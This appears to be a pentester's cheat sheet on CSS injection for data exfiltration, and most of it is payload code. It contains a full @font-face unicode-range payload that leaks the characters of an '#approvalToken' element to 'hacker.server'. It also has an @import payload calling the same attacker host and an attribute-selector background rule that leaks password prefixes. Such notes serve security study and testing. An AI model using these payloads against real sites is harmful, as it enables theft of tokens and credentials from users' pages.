# Content

## sources 

- [aszx87410 beyond-xss pt 1](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)
- [aszx87410 beyond-xss pt 2](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection-2/)
- [hack tricks](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)


## CSS font injection

you can exflirtate content using @font-face and unicode range
```css

@font-face {
    font-family: "f1";
    src: url(https://hacker.server?q=1);
    unicode-range: U+31;
  }

  @font-face {
    font-family: "f2";
    src: url(https://hacker.server?q=2);
    unicode-range: U+32;
  }

  @font-face {
    font-family: "f3";
    src: url(https://hacker.server?q=3);
    unicode-range: U+33;
  }

  @font-face {
    font-family: "f4";
    src: url(https://hacker.server?q=4);
    unicode-range: U+34;
  }

  @font-face {
    font-family: "f5";
    src: url(https://hacker.server?q=5);
    unicode-range: U+35;
  }

  @font-face {
    font-family: "f6";
    src: url(https://hacker.server?q=6);
    unicode-range: U+36;
  }

  @font-face {
    font-family: "f7";
    src: url(https://hacker.server?q=7);
    unicode-range: U+37;
  }

  @font-face {
    font-family: "f8";
    src: url(https://hacker.server?q=8);
    unicode-range: U+38;
  }

  @font-face {
    font-family: "f9";
    src: url(https://hacker.server?q=9);
    unicode-range: U+39;
  }

  @font-face {
    font-family: "f0";
    src: url(https://hacker.server?q=0);
    unicode-range: U+30;
  }



  @font-face {
    font-family: "fa";
    src: url(https://hacker.server?q=a);
    unicode-range: U+61;
  }

  @font-face {
    font-family: "fb";
    src: url(https://hacker.server?q=b);
    unicode-range: U+62;
  }

  @font-face {
    font-family: "fc";
    src: url(https://hacker.server?q=c);
    unicode-range: U+63;
  }

  @font-face {
    font-family: "fc";
    src: url(https://hacker.server?q=c);
    unicode-range: U+63;
  }

  @font-face {
    font-family: "fd";
    src: url(https://hacker.server?q=d);
    unicode-range: U+64;
  }

  @font-face {
    font-family: "fe";
    src: url(https://hacker.server?q=e);
    unicode-range: U+65;
  }

  @font-face {
    font-family: "ff";
    src: url(https://hacker.server?q=f);
    unicode-range: U+66;
  }

  @font-face {
    font-family: "fg";
    src: url(https://hacker.server?q=g);
    unicode-range: U+67;
  }

  @font-face {
    font-family: "fh";
    src: url(https://hacker.server?q=h);
    unicode-range: U+68;
  }

  @font-face {
    font-family: "fi";
    src: url(https://hacker.server?q=i);
    unicode-range: U+69;
  }

  @font-face {
    font-family: "fj";
    src: url(https://hacker.server?q=j);
    unicode-range: U+6A;
  }

  @font-face {
    font-family: "fk";
    src: url(https://hacker.server?q=k);
    unicode-range: U+6B;
  }

  @font-face {
    font-family: "fl";
    src: url(https://hacker.server?q=l);
    unicode-range: U+6C;
  }


  @font-face {
    font-family: "fm";
    src: url(https://hacker.server?q=m);
    unicode-range: U+6D;
  }

  @font-face {
    font-family: "fn";
    src: url(https://hacker.server?q=n);
    unicode-range: U+6E;
  }

  @font-face {
    font-family: "fo";
    src: url(https://hacker.server?q=o);
    unicode-range: U+6F;
  }

  @font-face {
    font-family: "fp";
    src: url(https://hacker.server?q=p);
    unicode-range: U+70;
  }

  @font-face {
    font-family: "fq";
    src: url(https://hacker.server?q=q);
    unicode-range: U+71;
  }

  @font-face {
    font-family: "fr";
    src: url(https://hacker.server?q=r);
    unicode-range: U+72;
  }

  @font-face {
    font-family: "fs";
    src: url(https://hacker.server?q=s);
    unicode-range: U+73;
  }

  @font-face {
    font-family: "ft";
    src: url(https://hacker.server?q=t);
    unicode-range: U+74;
  }

  @font-face {
    font-family: "fu";
    src: url(https://hacker.server?q=u);
    unicode-range: U+75;
  }

  @font-face {
    font-family: "fv";
    src: url(https://hacker.server?q=v);
    unicode-range: U+76;
  }

  @font-face {
    font-family: "fw";
    src: url(https://hacker.server?q=w);
    unicode-range: U+77;
  }

  @font-face {
    font-family: "fx";
    src: url(https://hacker.server?q=x);
    unicode-range: U+78;
  }

  @font-face {
    font-family: "fy";
    src: url(https://hacker.server?q=y);
    unicode-range: U+79;
  }

  @font-face {
    font-family: "fz";
    src: url(https://hacker.server?q=z);
    unicode-range: U+7A;
  }

  @font-face {
    font-family: "fA";
    src: url(https://hacker.server?q=A);
    unicode-range: U+41;
  }

  @font-face {
    font-family: "fB";
    src: url(https://hacker.server?q=B);
    unicode-range: U+42;
  }

  @font-face {
    font-family: "fC";
    src: url(https://hacker.server?q=C);
    unicode-range: U+43;
  }

  @font-face {
    font-family: "fD";
    src: url(https://hacker.server?q=D);
    unicode-range: U+44;
  }

  @font-face {
    font-family: "fE";
    src: url(https://hacker.server?q=E);
    unicode-range: U+45;
  }

  @font-face {
    font-family: "fF";
    src: url(https://hacker.server?q=F);
    unicode-range: U+46;
  }

  @font-face {
    font-family: "fG";
    src: url(https://hacker.server?q=G);
    unicode-range: U+47;
  }

  @font-face {
    font-family: "fH";
    src: url(https://hacker.server?q=H);
    unicode-range: U+48;
  }

  @font-face {
    font-family: "fI";
    src: url(https://hacker.server?q=I);
    unicode-range: U+49;
  }

  @font-face {
    font-family: "fJ";
    src: url(https://hacker.server?q=J);
    unicode-range: U+4A;
  }

  @font-face {
    font-family: "fK";
    src: url(https://hacker.server?q=K);
    unicode-range: U+4B;
  }

  @font-face {
    font-family: "fL";
    src: url(https://hacker.server?q=L);
    unicode-range: U+4C;
  }

  @font-face {
    font-family: "fM";
    src: url(https://hacker.server?q=M);
    unicode-range: U+4D;
  }
  
  @font-face {
    font-family: "fN";
    src: url(https://hacker.server?q=N);
    unicode-range: U+4E;
  }

  @font-face {
    font-family: "fO";
    src: url(https://hacker.server?q=O);
    unicode-range: U+4F;
  }

  @font-face {
    font-family: "fP";
    src: url(https://hacker.server?q=P);
    unicode-range: U+50;
  }

  @font-face {
    font-family: "fQ";
    src: url(https://hacker.server?q=Q);
    unicode-range: U+51;
  }

  @font-face {
    font-family: "fR";
    src: url(https://hacker.server?q=R);
    unicode-range: U+52;
  }

  @font-face {
    font-family: "fS";
    src: url(https://hacker.server?q=S);
    unicode-range: U+53;
  }

  @font-face {
    font-family: "fT";
    src: url(https://hacker.server?q=T);
    unicode-range: U+54;
  }

  @font-face {
    font-family: "fU";
    src: url(https://hacker.server?q=U);
    unicode-range: U+55;
  }


  @font-face {
    font-family: "fV";
    src: url(https://hacker.server?q=V);
    unicode-range: U+56;
  }


  @font-face {
    font-family: "fW";
    src: url(https://hacker.server?q=W);
    unicode-range: U+57;
  }

  @font-face {
    font-family: "fX";
    src: url(https://hacker.server?q=X);
    unicode-range: U+58;
  }

  @font-face {
    font-family: "fY";
    src: url(https://hacker.server?q=Y);
    unicode-range: U+59;
  }

  @font-face {
    font-family: "fZ";
    src: url(https://hacker.server?q=Z);
    unicode-range: U+5A;
  }

  
  .d-none {
    display: block !important;
  }


  #approvalToken {
    font-family: 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f0', 'fa', 'fb', 'fc', 'fd', 'fe', 'ff', 'fg', 'fh', 'fi', 'fj', 'fk', 'fl', 'fm', 'fn', 'fo', 'fp', 'fq', 'fr', 'fs', 'ft', 'fu', 'fv', 'fw', 'fx', 'fy', 'fz', 'fA', 'fB', 'fC', 'fD', 'fE', 'fF', 'fG', 'fH', 'fI', 'fJ', 'fK', 'fL', 'fM', 'fN', 'fO', 'fP', 'fQ', 'fR', 'fS', 'fT', 'fU', 'fV', 'fW', 'fX', 'fY', 'fZ';
    /* Specify other CSS properties for .form-group if needed */
  }

```

## CSS @import injection 

using [hackvertor blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration) or manually you can exflritate content
```css
<style>
@import 'http://hacker.server/start';    
</style>
```

## css Background injection
this can be used to exflritate data based on dom elements
```
[data-username="user"] ~ [data-password^="hellyah"] {
    /* Your styles here */
    background: url('http://server.com');
}
```
